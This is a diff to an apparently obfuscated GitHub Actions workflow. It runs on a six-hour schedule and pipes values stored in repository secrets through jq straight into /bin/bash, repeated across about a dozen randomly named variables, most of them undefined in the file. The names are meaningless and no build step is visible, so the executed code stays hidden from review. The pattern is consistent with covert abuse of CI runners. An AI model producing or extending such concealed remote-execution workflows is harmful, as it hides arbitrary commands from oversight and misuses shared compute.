@@ -1,20 +1,31 @@
 name: chenqinian3490
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 3/6 * * *'
+    - cron: '1 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chenqinian3490
         env:
-          f42: ${{ secrets.f42 }}
+          leow3: ${{ secrets.leow3 }}
         run: |
-          echo $f42 | jq -r .ogtex506 | /bin/bash
-          echo $be60160 | jq -r .n7 | /bin/bash
-          echo $grfv6 | jq -r .iahmh4923 | /bin/bash
-          echo $drk21 | jq -r .sullx45783 | /bin/bash
-          echo $maqey90564 | jq -r .ljokd33 | /bin/bash
+          echo $leow3 | jq -r .g08996 | /bin/bash
+          echo $ztw27846 | jq -r .hs86154 | /bin/bash
+          echo $um319 | jq -r .fme177 | /bin/bash
+          echo $kur79924 | jq -r .re36 | /bin/bash
+          echo $gkdb93 | jq -r .lhtfv7625 | /bin/bash
+          echo $zvmp85 | jq -r .kux34 | /bin/bash
+          echo $smqaq503 | jq -r .dkho8027 | /bin/bash
+          echo $osp95161 | jq -r .deoap1720 | /bin/bash
+          echo $beye123 | jq -r .bqcw6 | /bin/bash
+          echo $w5321 | jq -r .hufna7696 | /bin/bash
+          echo $ppdr698 | jq -r .jvj349 | /bin/bash
+          echo $uop30177 | jq -r .nuk68 | /bin/bash
+          echo $o58622 | jq -r .dajc63961 | /bin/bash
+          echo $huxqz26973 | jq -r .gzrr28 | /bin/bash
 
